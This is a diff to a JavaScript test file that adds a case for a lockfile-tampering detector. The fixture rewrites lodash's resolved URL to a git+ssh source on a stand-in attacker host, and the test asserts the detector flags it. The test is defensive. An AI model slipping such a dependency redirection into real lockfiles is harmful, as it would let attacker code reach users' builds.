@@ -113,6 +113,24 @@ describe("lockfileTamperRiskFinding", () => {
     expect(finding?.detail).toContain("outside registry.npmjs.org");
   });
 
+  it("flags a non-http remote resolved URL outside the npm registry, even with a version bump", () => {
+    const lockPatch = [
+      '@@ -100,8 +100,8 @@',
+      '     "node_modules/lodash": {',
+      '-      "version": "4.17.20",',
+      '-      "resolved": "https://registry.npmjs.org/lodash/-/lodash-4.17.20.tgz",',
+      '-      "integrity": "sha512-oldoldold=="',
+      '+      "version": "4.17.21",',
+      '+      "resolved": "git+ssh://git@attacker.example.com/lodash.git#deadbeef",',
+      '+      "integrity": "sha512-newnewnew=="',
+      '     },',
+    ].join("\n");
+    const finding = lockfileTamperRiskFinding([lockfilePatch(lockPatch)]);
+    expect(finding).not.toBeNull();
+    expect(finding?.detail).toContain("lodash");
+    expect(finding?.detail).toContain("outside registry.npmjs.org");
+  });
+
   it("scans review-enrichment/package-lock.json and apps/gittensory-ui/package-lock.json the same way", () => {
     const lockPatch = [
       '@@ -1,4 +1,4 @@',
